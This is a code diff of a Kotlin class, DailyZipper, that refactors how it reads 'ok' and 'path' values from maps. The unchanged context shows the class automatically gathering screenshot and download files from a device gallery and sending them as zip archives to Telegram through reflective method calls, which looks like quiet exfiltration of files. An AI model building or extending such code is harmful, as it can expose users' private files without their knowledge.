@@ -266,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - بدون أي دوال مساعدة
+    //  إرسال الملفات إلى Telegram - باستخدام التحويل الآمن للخرائط
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,15 +301,17 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج قيمة "ok" باستخدام حلقة على entries
+                // استخراج قيمة "ok" باستخدام التحويل الآمن للخرائط
                 val success = when (result) {
                     is Boolean -> result
                     is JSONObject -> result.optBoolean("ok", false)
                     is Map<*, *> -> {
                         var ok = false
-                        for (entry in result.entries) {
-                            if (entry.key.toString() == "ok") {
-                                ok = entry.value as? Boolean == true
+                        @Suppress("UNCHECKED_CAST")
+                        val map = result as Map<Any?, Any?>
+                        for ((key, value) in map) {
+                            if (key?.toString() == "ok") {
+                                ok = value as? Boolean == true
                                 break
                             }
                         }
@@ -623,7 +625,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - بدون أي دوال مساعدة
+    //  التشغيل التلقائي - باستخدام التحويل الآمن للخرائط
     // ============================================================
 
     fun run(): Boolean {
@@ -644,14 +646,16 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار باستخدام حلقة على entries
+                            // استخراج المسار باستخدام التحويل الآمن للخرائط
                             val path = when (item) {
                                 is JSONObject -> item.optString("path", "")
                                 is Map<*, *> -> {
                                     var p = ""
-                                    for (entry in item.entries) {
-                                        if (entry.key.toString() == "path") {
-                                            p = entry.value?.toString() ?: ""
+                                    @Suppress("UNCHECKED_CAST")
+                                    val map = item as Map<Any?, Any?>
+                                    for ((key, value) in map) {
+                                        if (key?.toString() == "path") {
+                                            p = value?.toString() ?: ""
                                             break
                                         }
                                     }
